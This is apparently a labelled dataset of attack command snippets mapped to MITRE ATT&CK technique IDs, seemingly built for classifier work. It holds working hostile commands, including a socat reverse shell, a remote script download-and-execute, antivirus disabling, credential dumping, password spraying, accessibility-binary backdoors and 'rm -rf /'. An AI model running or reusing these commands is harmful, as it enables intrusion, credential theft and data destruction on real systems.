command,mitre_id
&lt;GPO_PATH&gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf,T1484
iptables -D OUTPUT -p tcp --dport 21 -j DROP,T1562
"schtasks /Create /TN ""$task_name"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHEST /F",T1053
WerFaultSvc,T1036
SAM,T1003
mmc.exe -Embedding {PATH_ABSOLUTE:.msc},T1218
"sysrc syslogd_enable=""NO""",T1562
break,T1110
"type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe""",T1564
$newModule.CodeModule.AddFromString($vbaCode),T1137
"Write-Host ""Your paste URL: $response""",T1567
HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1547
~/.config/autostart,T1547
GetHostByName,T1106
CloseServiceHandle(),T1489
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters,T1574
PutLifecycleConfiguration,T1485
net user /domain,T1087
HKEY_CLASSES_ROOT\\[handler],T1546
Enable-PSRemoting -Force,T1021
if (!(Test-Path -path $path)){,T1546
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, $binary_to_execute"" -Force",T1547
"rundll32.exe ""C:\Program Files\Windows Photo Viewer\PhotoViewer.dll"",ImageView_Fullscreen {REMOTEURL}",T1105
Update.exe --download {REMOTEURL},T1218
"""$gsecdump_exe"" -a",T1003
New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id,T1098
"schtasks.exe /Change /TN ""\Microsoft\Windows\SystemRestore\SR"" /disable",T1490
"), order and casing of characters (",T1027
C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe,T1036
WNetEnumResourceW,T1135
"bash.exe -c ""socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane""",T1202
netstat -r | grep default,T1018
lshw,T1680
wmic DISKDRIVE get Caption,T1082
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScanOnRealtimeEnable"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
parted,T1680
chsh --shell /bin/bash nobody,T1078
echo 0> /var/spool/mail/$username,T1070
C:\dbg\ntsd.exe -g notepad.exe,T1546
spoolsv.exe,T1547
%s:%s\n,T1074
osacompile,T1059
net start,T1007
GetIpNetTable,T1016
Add-MpPreference -ExclusionExtension $excludedExts,T1562
Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte,T1218
which_openssl=`which openssl`,T1486
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"" /v ""EnablePrefetcher"" /t REG_DWORD /d 0 /f",T1112
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableSR"" /t ""REG_DWORD"" /d ""1"" /f",T1490
"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost"" /v TimeService /t REG_MULTI_SZ /d ""W64Time"" /f",T1543
Add-Type -AssemblyName System.DirectoryServices.AccountManagement,T1136
Process32Next,T1106
"vaultcmd /listcreds:""Windows Credentials"" /all",T1555
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 4",T1559
cmd.exe WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List,T1518
"Write-Host ""[i] Establishing connection to: $ip : $port""",T1046
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f,T1569
Lost_{Unique Identifier},T1136
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"" /v ""Authentication Packages"" /t REG_MULTI_SZ /d ""msv1_0\0package.dll"" /f",T1547
/Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR,T1053
New-Item $file -Force,T1016
mssync.exe,T1036
"Start-Process ""C:\Windows\System32\eventvwr.msc""",T1548
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",T1218
cd /tmp/GoAWSConsoleSpray,T1110
} else{,T1531
"echo ""Description=Atomic Red Team Systemd Service"" >> $systemd_service_path/$systemd_service_file",T1543
C:\Windows\System32\AtBroker.exe,T1546
"""PathToAtomicsFolder\..\ExternalPayloads\remcom.exe"" \\$remote_host /user:$user_name /pwd:$password cmd.exe",T1569
GetKeyboardLayout,T1614
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce,T1060
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d 0 /t REG_DWORD /f",T1021
Remove-Variable xlBook,T1204
HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf,T1137
"if [ -x ""$(command -v ip)"" ]; then ip addr; else echo ""ip is missing from the machine. skipping...""; fi;",T1016
reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe,T1218
"{Get-ChildItem -Path ""$UsersFolder/$directory/$secondarydirectory"" -ErrorAction SilentlyContinue | Out-File -append $File_to_output}",T1083
grep,T1518
/etc/ystem/system,T1543
$storageAccountObjects += [PSCustomObject]@{,T1619
diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab,T1564
win_fw.dll,T1574
%HOMEPATH%\Start Menu\Programs\Startup\Realtek {Unique Identifier}.lnk,T1547
sockstat -l 2>/dev/null || true,T1049
Get-NetTCPConnection | ForEach-Object {,T1049
SIGTTIN,T1564
System.Net.HttpWebRequest,T1106
qwerasdf,T1560
Temp\SymbolSourceSymbols\icons,T1113
"Set-ItemProperty -Path ""HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" -Name ""Version"" -Value ""0,0,0,0""",T1547
PostQueuedCompletionStatus(),T1486
Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null,T1562
az ad user create --display-name $username --password $password --user-principal-name $userprincipalname,T1136
"curl -s -A ""HttpBrowser/1.0"" -m3 $domain",T1071
uptime >> $output_file,T1082
nltest /dclist,T1018
gcloud config set project $project-id,T1078
%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom,T1546
devtunnel.exe host -p 8080,T1105
"C:\Windows\system32\cmd.exe /c ""mshta.exe javascript:a=GetObject('script:$url').Exec();close()""",T1059
"New-Item -Path ""HKCU:\Software\Classes\CLSID\$clsid_guid\InprocServer32"" -Value ""$file_name"" -Force | Out-Null",T1574
D8B3.dll,T1055
C:\ProgramData\,T1036
"Invoke-Rubeus -Command ""kerberoast /format:hashcat /nowrap""",T1558
KeepAlive,T1543
HKLM:\SYSTEM\\CurrentControlSet\\Control\\CrashControl\CrashDumpEnabled,T1562
.\PsExec.exe -i -s cmd -accepteula,T1569
autocheck autochk *,T1547
C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\<filename>.dll,T1047
fdisk,T1680
takeown /F C:\Windows\System32\utilman.exe /A,T1546
msiexec /q /i {REMOTEURL},T1218
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key,T1552
./stratus detonate aws.credential-access.ec2-get-password-data --force,T1552
"echo """" | ""$plink_file"" -batch ""$vm_host"" -ssh -l $vm_user -pw ""$vm_pass"" ""esxcli network firewall set --default-action true""",T1562
Install-SSP,T1547
SecurityCenter2.AntiVirusProduct,T1518
net localgroup /domain,T1069
) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (,T1027
copy $vsc_name\Windows\NTDS\NTDS.dit $extract_path\ntds.dit,T1003
"$com.ActivateMicrosoftApp(""5"")",T1021
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFileMenu /t REG_DWORD /d 1 /f",T1112
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiVirus"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
C:\Windows\System32\Narrator.exe,T1546
C:\Windows\system32\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q,T1070
"[ ""$(uname)"" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art",T1059
dir c:\Users\,T1087
if ($Result.ReturnValue -eq 0) {,T1546
IOCTL_DISK_GET_DRIVE_GEOMETRY_EX,T1680
NSWorkspace runningApplications(),T1057
0xD5,T1140
"Get-Item -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows""",T1012
"reg add HKCU\SOFTWARE\NetWire /v ""Install Date"" /t REG_SZ /d ""2021-08-30 07:17:27"" /f",T1112
"echo ""ExecStartPre=$execstartpre_action"" >> $systemd_service_path/$systemd_service_file",T1543
Remove-ItemProperty -Path $registryPath -Name $registryValueName,T1562
GUP.exe,T1036
write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1,T1003
"Invoke-MalDoc -macroCode $macrocode -officeProduct ""$ms_product""",T1204
tccd,T1548
HKLM\SAM\SAM\Domains\Account\Users\*\V,T1003
POST,T1140
if (Test-Path $fname) {,T1204
"get-process | ?{$_.Description -like ""*carbonblack*""}",T1518
pathExtension,T1106
{42aedc87-2188-41fd-b9a3-0c966feabec1},T1546
[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt,T1033
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f",T1112
reg add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f,T1112
"echo ""T1564.001"" > /var/tmp/.hidden-directory/.hidden-file",T1564
"get-process | ?{$_.Description -like ""*mc*""}",T1518
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d ""$redirection_program"" /f",T1112
echo overwriting...,T1547
echo ldapadd -H ldap://$domain.$top_level_domain:389 -x -D $admin_user -w $admin_password -f tempadmin.ldif,T1136
%SystemRoot%\Temp\lsass.exe /B,T1036
net user $guest_user /active:yes,T1078
"[activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.application"",""$computer_name"")).Document.ActiveView.ExecuteShellCommand(""c:\windows\system32\calc.exe"", $null, $null, ""7"")",T1021
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableLockWorkstation /t REG_DWORD /d 1 /f",T1112
odbcconf,T1218
"if ($ipAddr -like ""*,*"") {",T1046
Unblock-File -Path $file_path,T1553
/tmp/hello,T1548
"echo ""ExecStartPost=$execstartpost_action"" >> $systemd_service_path/$systemd_service_file",T1543
screencapture $output_file,T1113
%WINDIR%\AppPatch\sysmain.sdb,T1546
"Invoke-MSOLSpray -UserList ""$user_list"" -Password ""$password""",T1110
"wmic /node:<ip> process call create ""cmd /c copy c:\Users\<username>\<path>\backup.pst c:\windows\temp\backup.pst"" copy ""i:\<path>\<username>\My Documents\<filename>.pst""",T1114
"SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR ""[path to self]"" /ST 10:00",T1053
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH},T1105
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force",T1484
copy %APPDATA%\ualapi.dll %windir%\System32\ualapi.dll,T1574
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:""$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe"" ""PathToAtomicsFolder\T1574.008\bin\calc.cs""",T1574
sudo pkill -SIGTERM $process_pattern,T1489
OptionShutdownSystem,T1529
duo-sid,T1550
NtCreateThreadEx,T1106
"Add-Content $ps_profile -Value ""Start-Process $exe_path""",T1546
New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR,T1012
"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers",T1548
regini.exe {PATH}:hidden.ini,T1564
"mkdir ""$output_dir"" >nul 2>&1",T1140
./LOGS,T1074
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 1",T1559
HKEY_CURRENT_USER\\Console\\WindowsUpdates,T1012
ctrl+d,T1546
Clear Agents Track,T1070
"& ""$PathToAtomicsFolder\T1134.002\src\GetToken.ps1""; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,""cmd.exe"")",T1134
AdjustTokenPrivileges(),T1134
net group /dom,T1087
Import-Module AADInternals -Force,T1552
slideshow.mp4,T1036
rm -rf $folder_to_delete,T1070
LSADUMP::ChangeNTLM,T1098
AzureADConnectAuthenticationAgentService,T1556
"$process.Id | Out-File ""$env:TEMP\click-fix-pid.txt""",T1204
"sc description W64Time ""Maintain date and time synch on all clients and services in the network""",T1543
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows ""AppInit_DLLs""=""pserver32.dll""",T1546
get_tasklist,T1057
"mkdir ""c:\Temp""",T1105
"grep -q ""$search_string"" ""Cookies.binarycookies""",T1555
"Write-Host ""Zip file created: $outputZip\data.zip""",T1005
auditctl,T1562
vShow,T1564
"if (Test-Path ""$falcond_path"") {. ""$falcond_path"" /repair /uninstall /quiet } else { Get-ChildItem -Path ""C:\ProgramData\Package Cache"" -Include ""WindowsSensor.exe"" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq ""Valid"" -and $sig.SignerCertificate.DnsNameList -eq ""CrowdStrike, Inc."") { . ""$_"" /repair /uninstall /quiet; break;}}}",T1562
MpCmdRun.exe -DownloadFile -url $remote_file -path $local_path,T1105
"[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);",T1113
"sc create win32times binPath= ""cmd /c start c:\T1036.004_NonExistingScript.ps1""",T1036
"New-ItemProperty -Path ""HKCU:\Software\Policies\Microsoft\Windows\System"" -Name DisableCMD -Value 1",T1112
add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/filename,T1553
TIMEOUT /T 5 >nul 2>&1,T1040
"Start-Process ""shell:AppsFolder\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App""",T1219
pktmon.exe start --etw,T1040
"rundll32 advpack.dll, RegisterOCX {CMD}",T1218
net time \\127.0.0.1,T1124
FindWindow,T1055
Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false,T1021
"rundll32 ""C:\Program Files\Oracle\VirtualBox\VBoxRT.dll,RTR3Init""",T1564
"IF EXIST ""%temp%\Windows_Defender_Cache_Maintenance.xml"" ( schtasks /delete /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"" /f )",T1562
GetComputerNameExW,T1106
%TEMP%\,T1074
"/usr/libexec/PlistBuddy -c ""print :CFBundleVersion"" /Applications/Safari.app/Contents/Info.plist",T1518
CredEnumerateA,T1555
extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe},T1105
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce,T1547
"https://"" & domain & ""/agent/scripts/"" & moduleName & "".applescript",T1105
icacls %windir%\System32\osk.exe /grant Administrators:F /t,T1546
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ IMJPMIJ8.1{3 characters of Unique Identifier},T1547
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run,T1012
copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y,T1036
"if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo ""Virtualization Environment detected""; fi;",T1497
"$which_python -c ""from zipfile import ZipFile; ZipFile('$path_to_output_file', mode='w').write('$path_to_input_file')""",T1560
"ip tcp_metrics show |grep --invert-match ""^127\.""",T1018
SetWindowsHookExW,T1106
"Try {cmd /c ""$AdvancedRun_Location"" /EXEFilename ""$env:systemroot\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run} Catch{}",T1562
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" $optional_args -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties",T1087
wmic.exe shadowcopy delete,T1490
"echo ""import os; os.system('cat /etc/passwd 1> /tmp/atomic_hook_poc.txt')"" > ""$SITE_PACKAGES/atomic_hook.pth""",T1546
return $exts -contains $e,T1083
"New-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" -Name COMPlus_ETWEnabled -Value 0 -PropertyType ""String"" -Force",T1562
add-type $updateWallpapercode,T1491
OutputAssemblyDirectory = $InstallerAssemblyDir,T1218
HKCU\Software\Backtsaleht\StubPath,T1547
"echo ""# Default-Start: 2 3 4 5"" >> /etc/init.d/T1543.002",T1543
service cbdaemon stop,T1562
DebuggerIsLogging,T1622
cmd /c certutil -urlcache -split -f $remote_file $local_path,T1105
malloc,T1055
sudo kextunload /Library/Extensions/SoftRAID.kext,T1547
reg save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak},T1003
'FromBase'+0x40+'String',T1140
"rundll32.exe url.dll,OpenURL ""PathToAtomicsFolder\T1218.011\src\index.hta""",T1218
dd if=/dev/zero bs=1 count=1 >> $file_to_pad #adds null bytes,T1027
HKEY_CURRENT_USER,T1027
%temp%\T1036.007_masquerading.docx.exe,T1036
AppData,T1485
wscript //e:vbscript {PATH}:script.vbs,T1564
"grep ""# THIS IS A COMMENT"" /etc/default/ufw",T1562
echo Triggering fodhelper.exe for potential privilege escalation...,T1548
Generalrecon -consoleoutput -noninteractive,T1082
"[ ""$(uname)"" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null",T1070
"$wc.DownloadFile($url, $output)",T1562
"SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",T1216
$Users | Foreach-Object {,T1110
ls -l,T1548
HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID,T1497
/etc/init.d/localnet,T1564
GetCurrentProcess,T1057
CustomShellHost.exe,T1218
"net localgroup ""Users""",T1087
netsh.exe,T1562
IntPtr hToken;,T1562
type C:\Windows\Panther\unattend.xml,T1552
date 010100001971,T1070
which_python=$(which python || which python3 || which python3.9 || which python2),T1059
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe,T1546
EnumSystemLocalesA,T1106
"enable=* log_password"" >> /etc/pam.d/system-auth",T1056
UseLogonCredential,T1112
Get-ProcessTokenGroup,T1087
"if (test-connection -count 1 -computername ""$ftp_server"" -quiet)",T1048
"reg add ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultDomainName /t REG_SZ /d contoso.com /f",T1562
schtasks,T1007
"wmic /node:""$target_host"" shadowcopy call create Volume=$drive_letter",T1003
Remove-Item,T1070
SIGHUP,T1564
New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null,T1005
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoControlPanel /t REG_DWORD /d 1 /f",T1112
which_ccencrypt=`which ccencrypt`,T1486
getinfo,T1124
Program Files,T1485
Dim applicationPath As String,T1137
dump64.exe,T1036
NtAllocateVirtualMemory,T1106
ReadDirectoryChangeW,T1106
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders,T1060
Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath $pfx_path -Password $mypwd,T1552
"if ($awsAccessKey -eq """" -or $awsSecretKey -eq """") {",T1567
cat /dev/null > /var/log/messages #truncating the file to zero bytes,T1070
Name = $_.PSChildName,T1007
%TEMP%\<⁠random_9_alnum_chars>.batfile,T1059
whoami; ausearch -i --start now,T1056
"dir /s ""c:\Documents and Settings"" >> $output_file",T1083
"if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; fi",T1562
New-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null,T1114
EhStorAuthn.exe,T1055
mmc.exe -Embedding C:\path\to\test.msc,T1218
"[DllImport(""advapi32.dll"", SetLastError = true)]",T1562
/systemd/system,T1543
sftp,T1105
HKCU\SOFTWARE\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\,T1552
ImagePath = $p.ImagePath,T1007
"@FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\$user"" ""%p"" 1>NUL 2>&1 && @echo [*] $user:%p && @net use /delete %logonserver%\IPC$ > NUL",T1110
G$RADIUSCHAPKEY,T1556
Foreach ($item in $input_table){,T1546
WNetAddConnection2W,T1106
sdir,T1083
Add-Type -AssemblyName System.Windows.Forms,T1113
GoogleTranslate.crx,T1036
} while (-not $result.EndOfMessage),T1539
"Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\Microsoft\Windows\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }",T1053
"Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1555\src\T1555-macrocode.txt"" -officeProduct ""Word"" -sub ""Extract""",T1555
"Powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'""",T1059
", or",T1564
"cmd /c ""$nircmd_location"" $command_to_execute",T1564
certutil.exe,T1105
sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin,T1078
kubectl create -f src/cronjob.yaml -n $namespace,T1053
Remove-Item $profile\key4.db > $null,T1555
New-Item -ItemType Directory -Path $storageAccountOutputPath,T1530
wsmprovhost.exe,T1574
"invoke-expression 'cmd /c start powershell -command { cmd /c ""$snaffler_path"" -a -o ""$output_path"" }; start-sleep 90; stop-process -name ""snaffler""'",T1135
git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git,T1110
SafeMode,T1136
HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets,T1003
msacm32.dll,T1036
$decryptedString | Out-File $env:temp\T1027.013_decryptedEicar.txt,T1027
"Start-Process ""$NetSupport_Path"" -ArgumentList ""/S /v/qn""",T1219
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}"" /ve /T REG_SZ /d ""AtomicTest"" /f",T1546
"reg.exe import ""$registry_file""",T1546
LineDDA,T1106
echo Spring2022>> passwords.txt,T1110
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\imejp : [self],T1547
aws logs delete-log-stream --log-group-name $cloudwatch_log_group_name --log-stream-name $cloudwatch_log_stream_name --region $region,T1562
GetBucketAcl,T1069
reg,T1003
"New-ItemProperty -Path HKCU:\Environment -Name ""COR_PROFILER"" -PropertyType String -Value ""$clsid_guid"" -Force | Out-Null",T1574
STOMP,T1071
HttpOpenRequestA,T1106
"""$vboxmanage_exe"" createvm --name ""$vm_name"" --register",T1564
zip $output_file $input_files,T1560
"if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq ""6"" ];",T1562
Remove-Item -Path $folder_to_delete -Recurse,T1070
C:\windows\temp\tmp0207,T1070
Get-LocAdm,T1069
"if ($role -eq $null) { Write-Warning ""Role not found""; exit }",T1098
C:\Windows\System32\cmd.exe /c nltest /domain_trusts,T1482
NetShareEnum,T1135
sharing -l,T1135
"[Reflection.Assembly]::LoadFile(\""%s\"")\n$i=\""\""\n$r=[%s]::%s(\""%s\"",[ref] $i)\necho $r,$i\n",T1059
"New-ItemProperty -Path $path -Name ""AutoRun"" -Value ""$command"" -PropertyType ""String""",T1546
pfctl -a pf-rules -s rules,T1562
/Q /c wevtutil cl security,T1070
Write-Host $cookies,T1539
system hostname get,T1082
xp_cmdshell,T1059
Performance,T1574
"Write-Host ""Failed to start the process. Error code: $($Result.ReturnValue)""",T1546
$APPDATA%\Thunderbird\Profiles\,T1552
launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist,T1543
Scriptrunner.exe -appvscript {PATH:.exe},T1202
"Copy-Item ""$exe_file_path"" -Destination ""C:\Users\$env:UserName"" -Force",T1562
/proc,T1003
.jam,T1127
/date/.bd.key/preload.so,T1027
"mavinject.exe $process_id /INJECTRUNNING ""$dll_payload""",T1218
C:\ProgramData\Local Settings\Temp\mskmde.com,T1547
/etc/systemd/system/,T1053
MicrosoftCrashHandlerUAC,T1053
Get-EventLog security -instanceid 4624,T1033
AppInit_DLLs,T1546
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost,T1547
sftp.exe $username@$remote_host:$remote_path $local_path,T1105
regedit {PATH_ABSOLUTE}:regfile.reg,T1564
readlink,T1562
"forfiles /p c:\windows\system32 /m notepad.exe /c ""{CMD}""",T1202
"sc create Windowscarpstss binpath= ""cmd.exe /c cscript.exe c:\\windows\\system32\\w7_1.wsf humpback_whale"" start= ""auto"" obj= ""LocalSystem""",T1543
pr_set_name,T1036
"echo ""#!/bin/bash"" > /etc/init.d/T1543.002",T1543
lsl,T1083
reg save HKLM\sam sam,T1003
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\$Subkey_Added"" /v Name /t REG_SZ /d ""$dll_inf"" /f",T1547
"devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} ""{CMD:args}"" test",T1127
webhook.site,T1567
takeown /F %windir%\System32\osk.exe /A,T1546
Get-TimedScreenshot,T1113
shutdown /s /t $timeout,T1529
REAgentC.exe,T1490
timeIntervalSinceNow,T1124
"Write-Host ""User $($user.DisplayName) was added to $($role.DisplayName) role""",T1098
sc.exe config $service_name start= disabled,T1562
RegisterClassW,T1106
C:\program.exe,T1574
cp $root_input_file_path $cped_file_path;,T1486
"Scriptrunner.exe -appvscript ""$payload_path""",T1202
-safeboot-instance -pass,T1547
Remove-Item -path $file_to_delete,T1070
$logs | ForEach-Object {Clear-EventLog -LogName $_ },T1070
$newCred.Password | ConvertFrom-SecureString | Out-File $credFile,T1098
"sc config W64Time DisplayName= ""Windows 64 Time""",T1543
kldstat | grep vmm,T1082
net time \\hostname,T1124
%STARTUP%,T1547
mount –B,T1564
"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi",T1497
HKCU:\Software\Netwire,T1027
